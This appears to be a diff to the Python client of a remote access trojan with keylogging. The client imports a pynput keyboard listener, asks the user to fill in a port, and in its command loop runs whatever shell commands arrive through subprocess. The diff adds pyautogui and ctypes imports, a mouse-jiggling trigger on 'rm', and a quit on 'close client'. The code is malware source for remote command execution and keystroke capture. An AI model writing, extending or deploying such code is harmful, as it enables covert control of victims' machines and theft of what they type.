@@ -1,8 +1,11 @@
 import socket
+import pyautogui
+import random
 from threading import Timer
 import os
 import subprocess
 from pynput.keyboard import Listener, Key
+import ctypes
 
 HEADER = 8192
 PORT = 0  # Replace 0 With Your Port Number
@@ -99,8 +102,8 @@ while True:
         if "rm" in command.split():
             random_mouse()
             command = ""
-        if "close" in command.split():
-            client.close()
+        if "close client" in command:
+            quit()
         else:
             if command:
                 output = subprocess.getoutput(command)
